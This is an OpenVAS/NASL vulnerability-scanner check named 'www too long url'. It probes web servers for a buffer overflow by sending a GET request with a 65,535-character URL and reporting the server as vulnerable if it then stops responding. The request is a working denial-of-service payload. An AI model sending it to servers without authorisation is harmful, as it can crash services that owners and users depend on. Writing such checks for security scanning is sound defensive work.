if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.102004" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-06-23 09:27:52 +0200 (Tue, 23 Jun 2009)" );
	script_cve_id( "CVE-2000-0002", "CVE-2000-0065", "CVE-2000-0571", "CVE-2001-1250", "CVE-2003-0125", "CVE-2003-0833", "CVE-2006-1652", "CVE-2004-2299", "CVE-2002-1003", "CVE-2002-1012", "CVE-2002-1011", "CVE-2001-0836", "CVE-2005-1173", "CVE-2002-1905", "CVE-2002-1212", "CVE-2002-1120", "CVE-2000-0641", "CVE-2002-1166", "CVE-2002-0123", "CVE-2001-0820", "CVE-2002-2149" );
	script_name( "www too long url" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_category( ACT_DENIAL );
	script_family( "Buffer overflow" );
	script_copyright( "Copyright (C) 2009 LSS" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade vulnerable web server to latest version." );
	script_tag( name: "summary", value: "Remote web server is vulnerable to the too long URL vulnerability. It might be
  possible to gain remote access using buffer overflow." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
req = NASLString( "/", crap( 65535 ) );
req = http_get( item: req, port: port );
http_send_recv( port: port, data: req );
ret_code = http_is_dead( port: port, retry: 2 );
if( ret_code == 1 ){
	set_kb_item( name: "www/too_long_url_crash", value: TRUE );
	security_message( port: port );
}
else {
	exit( 99 );
}

